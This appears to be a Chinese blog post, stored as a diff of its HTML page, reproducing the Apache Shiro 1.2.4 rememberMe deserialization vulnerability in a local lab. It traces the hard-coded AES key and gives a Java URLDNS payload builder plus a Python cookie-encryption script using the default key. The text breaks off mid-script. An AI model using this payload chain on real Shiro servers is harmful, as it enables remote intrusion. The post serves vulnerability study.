@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="shiro反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro反序列化">
+<meta property="og:url" content="https://apsry.github.io/2022/04/03/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro550)/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="shiro反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951211.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951321.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951570.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132135115.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132053908.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132056114.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132058243.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132100016.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132103459.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132102645.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132105316.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132106661.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132110133.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132111804.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132114138.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132116324.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132116861.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132119634.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132119289.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132120860.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132122425.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132124370.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132125105.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132126685.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132126623.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132127965.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132137835.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132224309.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204022222452.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030941602.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030926992.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204030918434.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031057471.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132238881.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031110724.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031459258.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031459560.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031502198.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031504359.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031504616.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031505008.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031507316.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031508904.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031509448.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031511160.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031512807.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031513004.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031516753.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031519051.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031523456.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031547908.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031549167.png">
+<meta property="article:published_time" content="2022-04-03T11:26:00.000Z">
+<meta property="article:modified_time" content="2022-04-03T07:55:10.680Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951211.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/04/03/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro550)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>shiro反序列化 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/04/03/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro550)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shiro反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-03 19:26:00 / 修改时间：15:55:10" itemprop="dateCreated datePublished" datetime="2022-04-03T19:26:00+08:00">2022-04-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>shiro反序列化</p>
+<span id="more"></span>
+
+
+
+<h1 id="初时shiro-已填坑"><a href="#初时shiro-已填坑" class="headerlink" title="初时shiro(已填坑)"></a>初时shiro(已填坑)</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>直接从github上clone代码到本地。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/apache/</span>shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a></p>
+<p>直接下载也可</p>
+<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">所需环境</span><br><span class="line">编辑器: IDEA <span class="number">2020</span>(用的pj版本，会用到一个Tomcat <span class="built_in">Server</span>)</span><br><span class="line">java版本：jdk1<span class="number">.7</span><span class="number">.0</span>_80</span><br><span class="line"><span class="built_in">Server</span>版本 : Tomcat <span class="number">8.5</span><span class="number">.75</span>(直接下载core下面的zip)</span><br><span class="line">shiro版本：shiro-root<span class="number">-1.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951211.png" alt="在这里插入图片描述"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951321.png" alt="在这里插入图片描述"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203131951570.png" alt="在这里插入图片描述"></p>
+<p>插件下载</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132135115.png" alt="image-20220313213513042"></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我们抓包</p>
+<p>可以看到会有一个cookie，rememberMe</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132053908.png" alt="image-20220313205352782"></p>
+<p>我们摁两下shift查找跟cookie有关的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132056114.png" alt="image-20220313205606982"></p>
+<p>这里显然是有一个序列化</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132058243.png" alt="image-20220313205859109"></p>
+<p>首先是一个base64的加密</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132100016.png" alt="image-20220313210046946"></p>
+<p>我们继续找调用了<code>getRememberedSerializedIdentity</code>的地方</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132103459.png" alt="image-20220313210300328"></p>
+<p>到<code>AbstractRememberMeManager</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132102645.png" alt="image-20220313210244506"></p>
+<p>发现调用了加密后，又调用了<code>convertBytesToPrincipals</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132105316.png" alt="image-20220313210506247"></p>
+<p>跟进去，发现做了解密<code>decrypt</code>和反序列化<code>deserialize</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132106661.png" alt="image-20220313210603595"></p>
+<p>反序列化跟下去，就调了一个原生的反序列化</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132110133.png" alt="image-20220313211056074"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132111804.png" alt="image-20220313211117758"></p>
+<p>我们再看解密的点，先获取了一个key，再解密</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132114138.png" alt="image-20220313211420072"></p>
+<p>用key去解密</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132116324.png" alt="image-20220313211618268"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132116861.png" alt="image-20220313211640793"></p>
+<p>所以这个时候我们思考key是什么，有key就能解密。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132119634.png" alt="image-20220313211906573"></p>
+<p>然后跟进去看key,发现是一个常量</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132119289.png" alt="image-20220313211955243"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132120860.png" alt="image-20220313212005809"></p>
+<p>直接找赋值点</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132122425.png" alt="image-20220313212241285"></p>
+<p>可以看到赋值点</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132124370.png" alt="image-20220313212401238"></p>
+<p>再跟进<code>setDecryptionCipherKey</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132125105.png" alt="image-20220313212514038"></p>
+<p>再跟到<code>setCipherKey</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132126685.png" alt="image-20220313212610567"></p>
+<p>在<code>AbstractRememberMeManager</code>，</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132126623.png" alt="image-20220313212652520"></p>
+<p>跟进<code>DEFAULT_CIPHER_KEY_BYTES</code></p>
+<p>最后得到key的初始值</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132127965.png" alt="image-20220313212737907"></p>
+<p>思路</p>
+<p><strong>·</strong> 获取Cookie中rememberMe的值<br><strong>·</strong> 对rememberMe进行Base64解码<br><strong>·</strong> 使用AES进行解密<br><strong>·</strong> 对解密的值进行反序列化</p>
+<p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当CookieRememberMeManager对恶意的rememberMe进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p>
+<p>一般是CC链，而且shiro也含有CC，但是含的CC是test，一般不会去加载</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132137835.png" alt="image-20220313213742663"></p>
+<p><strong>urldns</strong></p>
+<p>我们可以直接用dns的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        写对象，序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://kj7cgaecm74q1ub7cy3ooq4pogu6iv.burpcollaborator.net&quot;),1);</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wee3kgam07c4f2vo9dar2nab62cs0h.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">HashcodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        HashcodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashcodeField.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//传一个url进去就可以了</span></span><br><span class="line">        <span class="comment">//serialize(person);</span></span><br><span class="line">        <span class="comment">//不发起请求，而且hashCode改为-1，反序列化的时候就可以解析dns</span></span><br><span class="line">        <span class="comment">//把hashCode改为-1</span></span><br><span class="line">        HashcodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        System.out.println(person);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成的ser.bin再加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> Lambda</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shiro_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS).encode()</span><br><span class="line">    <span class="comment">#pad = lambda s: s + ((BS - len(s) % BS)*chr(BS -len(s) % BS)).encode()</span></span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv  + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(shiro_enc(data)) </span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>替换cookie，记得把sessionID给删了，看代码逻辑如果不删是不会去解密的。可以看到收到了dns请求</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203132224309.png" alt="image-20220313222441162"></p>
+<p>代码执行</p>
+<p>shiro能打的只有CC4的第二条链子</p>
+<p>这边分析一下用shiro自身的链子去打exp</p>
+<h1 id="CommonsCollections示例"><a href="#CommonsCollections示例" class="headerlink" title="CommonsCollections示例"></a>CommonsCollections示例</h1><p>这里用CC3做演示</p>
+<h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204022222452.png" alt="image-20220402222224393"></p>
+<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>我们这边直接用CC3第6条链子来打</p>
+<p>这边直接生成bin文件，然后加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> Lambda</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shiro_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS).encode()</span><br><span class="line">    <span class="comment">#pad = lambda s: s + ((BS - len(s) % BS)*chr(BS -len(s) % BS)).encode()</span></span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext = 